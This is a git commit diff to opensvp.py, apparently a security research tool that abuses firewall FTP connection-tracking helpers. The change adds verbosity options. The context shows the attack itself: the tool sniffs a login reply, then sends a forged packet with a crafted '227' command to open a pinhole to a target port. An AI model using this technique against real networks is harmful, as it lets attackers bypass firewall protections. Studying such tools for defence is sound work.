c95d641fc165b3ecfe1dbb8c25c908ee5173f02a
Eric Leblond <eric@regit.org>
2011-05-19 00:04:24 +0200

    Add verbosity handling.

--- opensvp.py
+++ opensvp.py
@@ -14,10 +14,11 @@ from time import sleep
 
 class attack_target:
     def __init__(self):
-       self.ip = "192.168.2.2"
-       self.port = "5432"
-       self.iface="vboxnet0"
-       self.sent = 0
+        self.ip = "192.168.2.2"
+        self.port = "5432"
+        self.iface="vboxnet0"
+        self.sent = 0
+        self.verbose = False
 
 class ftp_helper(attack_target):
     def build_227_command(self):
@@ -28,10 +29,10 @@ class ftp_helper(attack_target):
 
     def ftp_from_server_callback(self, pkt):
         # match for login ok
-        print pkt.sprintf("%TCP.payload%")
         if self.sent == 0 and re.match("230",pkt.sprintf("%TCP.payload%")):
-            print "Working on following base"
-            print pkt.show()
+            if self.verbose:
+                print "Working on following base"
+                print pkt.show()
             # set ether pkt src as dst
             orig_src = pkt[Ether].src
             orig_dst = pkt[Ether].dst
@@ -45,15 +46,19 @@ class ftp_helper(attack_target):
             del att[TCP].chksum
             att[TCP].payload = self.build_227_command()
             # send packet
-            print "Sending attack packet"
-            print att.show()
-            sendp(att, iface=self.iface)
+            if self.verbose:
+                print "Sending attack packet"
+                print att.show()
+                sendp(att, iface=self.iface)
+            else:
+                sendp(att, iface=self.iface, verbose=0)
             self.sent = 1
             sys.exit(0)
           
     def ftp_connect(self, option=''):
         sleep(1)
-        print "Starting ftp connection"
+        if self.verbose:
+            print "Starting ftp connection"
         ftp = ftplib.FTP(self.ip)
         ftp.login("anonymous", "opensvp")
         sleep(2)
@@ -64,9 +69,10 @@ class ftp_helper(attack_target):
         sniff(iface=ftptarget.iface, prn=ftptarget.ftp_from_server_callback, filter=ftptarget.build_filter(), store=0)
 
 parser = argparse.ArgumentParser(description='Open selected pin hole in firewall')
-parser.add_argument('--server', default='192.168.2.2', help='server to attack')
-parser.add_argument('--helper', default='ftp', help='protocol and helper to attack (default to ftp)')
-parser.add_argument('--port', default=5432, help='target port that should be open on server after attack')
+parser.add_argument('-s', '--server', default='192.168.2.2', help='IP address of server to attack')
+parser.add_argument('--helper', default='ftp', help='Protocol and helper to attack (default to ftp)')
+parser.add_argument('-p', '--port', default=5432, help='Target port that should be open on server after attack')
+parser.add_argument('-v', '--verbose', default=False, action="store_true", help="Show verbose output")
 args = parser.parse_args()
 
 # if not root...kick out
@@ -77,6 +83,7 @@ if args.helper == 'ftp':
     ftptarget = ftp_helper()
     ftptarget.ip = args.server
     ftptarget.port = int(args.port)
+    ftptarget.verbose = args.verbose
     ftptarget.run()
 else:
-    print "Selected protocol is currently unsupported"
+    sys.exit("Selected protocol is currently unsupported")
